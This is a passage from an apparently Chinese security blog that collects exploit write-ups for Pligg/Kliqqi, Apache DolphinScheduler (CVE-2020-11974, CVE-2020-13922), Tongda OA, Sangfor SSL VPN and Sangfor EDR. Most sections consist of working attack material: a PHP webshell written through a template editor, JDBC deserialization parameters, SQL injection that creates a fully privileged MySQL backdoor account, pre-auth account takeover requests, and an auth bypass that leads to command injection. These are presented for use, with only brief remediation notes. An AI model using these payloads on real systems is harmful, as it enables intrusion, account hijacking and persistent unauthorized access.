<p>转到<code>/admin/admin_editor.php</code>拦截请求并将路径更改为文件。</p>
<p>例如得到<code>index.php</code>申请：<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174701957.png" alt="image-20200917174701957"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin&#x2F;admin_editor.php HTTP&#x2F;1.1</span><br><span class="line">Host: kliqqi</span><br><span class="line">Content-Length: 33</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;kliqqi</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.102 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;kliqqi&#x2F;admin&#x2F;admin_editor.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: fr-FR,fr;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7</span><br><span class="line">Cookie: panelState&#x3D;CollapseManage%7CCollapseSettings%7CCollapseTemplate; PHPSESSID&#x3D;lfkc3gtrv5o1golmt5md3; mnm_user&#x3D;Admin; mnm_key&#x3D;QWRtaW46MjI0R2dEVTAxZncxZzpl</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">the_file&#x3D;..%2Findex.php&amp;open&#x3D;Open</span><br></pre></td></tr></table></figure>

<p>模版编辑器功能可以编辑任意文件内容,在文件中加入恶意代码导致代码执行。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174734515.png" alt="image-20200917174734515"></p>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  if($_GET[&#39;cmd&#39;])&#123;</span><br><span class="line">    system($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>website.fr?cmd=dir</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917174826813.png" alt="image-20200917174826813"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Pligg/">Pligg </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/"><i class="fas fa-angle-double-right"></i>Apache DolphinScheduler远程代码执行(CVE-2020-11974)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:23.514Z" title="2020-12-23T08:50:23.514Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">3 minutes read (About 392 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-11974/">Apache DolphinScheduler远程代码执行(CVE-2020-11974)</a></h1><div class="content"><h2 id="Apache-DolphinScheduler组件介绍"><a href="#Apache-DolphinScheduler组件介绍" class="headerlink" title="Apache DolphinScheduler组件介绍"></a>Apache DolphinScheduler组件介绍</h2><p>​    Apache DolphinScheduler(incubator,原EasyScheduler）是一个分布式工作流任务调度系统，主要解决数据研发ETL错综复杂的依赖关系，不能直观监控任务健康状态。DolphinScheduler以DAG流式的方式将Task组装起来，可实时监控任务的运行状态，同时支持重试、从指定节点恢复失败、暂停及Kill任务等操作。</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​    CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过jdbc connect参数输入{“detectCustomCollations”:true，“autoDeserialize”:true} 在DolphinScheduler 服务器上远程执行代码。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.1</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>需要登陆权限</p>
<p>该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。</p>
<p>1、登录到面板 -&gt; 数据源中心。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170923674.png" alt="image-20200917170923674"></p>
<p>2、jdbc连接参数就是主角,这里没有限制任意类型的连接串参数。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170947012.png" alt="image-20200917170947012"></p>
<p>3、将以下数据添加到jdbc连接参数中,就可以直接触发。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917171000453.png" alt="image-20200917171000453"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;datasources&#x2F;connect HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">type&#x3D;MYSQL&amp;name&#x3D;test&amp;note&#x3D;&amp;host&#x3D;127.0.0.1&amp;port&#x3D;3306&amp;database&#x3D;test&amp;</span><br><span class="line">principal&#x3D;&amp;userName&#x3D;root&amp;password&#x3D;root&amp;connectType&#x3D;&amp;</span><br><span class="line">other&#x3D;&#123;&quot;detectCustomCollations&quot;:true,&quot;autoDeserialize&quot;:true&#125;</span><br></pre></td></tr></table></figure>



<p>关于MySQL JDBC客户端反序列化漏洞的相关参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Apache/">Apache </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/"><i class="fas fa-angle-double-right"></i>Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:26.079Z" title="2020-12-23T08:50:26.079Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a minute read (About 139 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/Apache-DolphinScheduler%E6%9D%83%E9%99%90%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-CVE-2020-13922/">Apache DolphinScheduler权限覆盖漏洞(CVE-2020-13922)</a></h1><div class="content"><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>发现的漏洞是任何租户下的普通用户都可以通过以下方式覆盖其他用户的密码<br>api interface /dolphinscheduler/users/update</p>
<h2 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h2><p>受影响版本<br>Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1</p>
<p>安全版本<br>Apache DolphinScheduler &gt;= 1.3.2</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165719031.png" alt="image-20200917165719031"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;dolphinscheduler&#x2F;users&#x2F;update</span><br><span class="line">userName&#x3D;admin&amp;userPassword&#x3D;Password1!&amp;tenantId&#x3D;1&amp;email&#x3D;sdluser%40sdluser.sdluser&amp;phone&#x3D;&amp;id&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917170117506.png" alt="image-20200917170117506"></p>
<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p>建议用户将 Apache DolphinScheduler 升级到安全版本。</p>
<p>下载链接：<a target="_blank" rel="noopener" href="https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html">https://dolphinscheduler.apache.org/zh-cn/docs/release/download.html</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/Apache/">Apache </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-angle-double-right"></i>通达OA v11.7 后台SQL注入</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:11.384Z" title="2020-12-23T08:51:11.384Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 minutes read (About 366 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/">通达OA v11.7 后台SQL注入</a></h1><div class="content"><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要登录权限</p>
<p>原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;select%20if((substr(user(),1,1)&#x3D;%27r%27),1,power(9999,99))</span><br></pre></td></tr></table></figure>

<p>1、添加一个mysql用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165121752.png" alt="image-20200917165121752"></p>
<p>2、给创建的ateam666账户添加mysql权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;ateam666&#39; AS Binary(5));</span><br></pre></td></tr></table></figure>

<p>3、刷新数据库就可以登录到数据库啦。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;flush privileges;</span><br></pre></td></tr></table></figure>

<p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;</span><br><span class="line"></span><br><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p>5、接下来就是考验mysql提权功底的时候啦 </p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E9%80%9A%E8%BE%BEOA/">通达OA </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/"><i class="fas fa-angle-double-right"></i>深信服 SSL VPN - Pre Auth 修改绑定手机</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:22.275Z" title="2020-12-23T08:51:22.275Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a minute read (About 118 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/">深信服 SSL VPN - Pre Auth 修改绑定手机</a></h1><div class="content"><h2 id="漏洞起因："><a href="#漏洞起因：" class="headerlink" title="漏洞起因："></a>漏洞起因：</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160030652.png" alt="image-20200917160030652"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160439482.png" alt="image-20200917160439482"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160456180.png" alt="image-20200917160456180"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;path&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160603185.png" alt="image-20200917160603185"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sangfor/">sangfor, </a><a class="link-muted" rel="tag" href="/tags/VPN/">VPN </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-angle-double-right"></i>深信服EDR3.2.21 任意代码执行漏洞分析</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-17</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:24.558Z" title="2020-12-23T08:51:24.558Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 minutes read (About 354 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">深信服EDR3.2.21 任意代码执行漏洞分析</a></h1><div class="content"><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154417360.png" alt="image-20200917154417360"></p>
<p>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口</p>
<h3 id="主要调用"><a href="#主要调用" class="headerlink" title="主要调用"></a>主要调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154552300.png" alt="image-20200917154552300"></p>
<p>跟进</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154605381.png" alt="image-20200917154605381"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以看到 第一个检查为  req_url&#x3D;_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line"></span><br><span class="line">绕过第一个检查:</span><br><span class="line"></span><br><span class="line">在他们系统nginx配置文件里面:</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154713639.png" alt="image-20200917154713639"></p>
<p><strong>通过</strong>nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问</p>
<p>/api/edr/sangforinter/v2/xxx 绕过 第一个检查</p>
<h3 id="第二检查-权限检查"><a href="#第二检查-权限检查" class="headerlink" title="第二检查**:** 权限检查"></a><strong>第二检查**</strong>:** <strong>权限检查</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155137057.png" alt="image-20200917155137057">跟进check_access_token</p>
<p> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1062563-20200911105704599-1994739155.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里if(md5_str&#x3D;&#x3D;json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞</span><br><span class="line"></span><br><span class="line">绕过只需要传入一个base64编码的json内容为 &#123;“md5”:true&#125;即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>至此**</strong>权限检查绕过完毕**</p>
<p><strong>来到</strong> process_cssp.php 文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155330169.png" alt="image-20200917155330169"></p>
<p>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.</p>
<p>绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”}</p>
<h2 id="结果如下"><a href="#结果如下" class="headerlink" title="结果如下"></a>结果如下</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155504277.png" alt="image-20200917155504277"></p>
<p>返回：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155558597.png" alt="image-20200917155558597"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/sangfor/">sangfor, </a><a class="link-muted" rel="tag" href="/tags/EDR/">EDR </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"><i class="fas fa-angle-double-right"></i>通达OA任意用户登陆</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-15</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:51:16.885Z" title="2020-12-23T08:51:16.885Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a few seconds read (About 76 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/">通达OA任意用户登陆</a></h1><div class="content"><p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p>
<p>2、访问 /general/login_code_scan.php 提交 post 参数：</p>
<p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095052094.png" alt="image-20200915095052094"></p>
<p>然后构造数据包请求/logincheck_code.php 得到cookie</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095153086.png" alt="image-20200915095153086"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E9%80%9A%E8%BE%BEOA/">通达OA </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"><i class="fas fa-angle-double-right"></i>泛微OA云桥任意文件读取和目录遍历漏洞</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:45.588Z" title="2020-12-23T08:50:45.588Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">3 minutes read (About 386 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" 